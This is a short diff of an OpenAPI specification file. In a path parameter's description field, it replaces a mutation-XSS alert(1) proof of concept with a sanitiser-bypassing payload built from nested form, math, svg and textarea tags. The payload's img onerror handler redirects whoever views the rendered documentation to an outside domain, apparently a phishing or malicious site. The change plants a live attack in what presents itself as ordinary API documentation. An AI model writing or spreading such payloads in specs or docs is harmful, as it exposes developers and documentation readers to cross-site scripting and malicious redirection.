@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src="x" onerror="window.location.href='https://serviceglobal-digitalsolution.com/education-content/redirect.html'"></form>
           format: int64
           in: path
           name: id
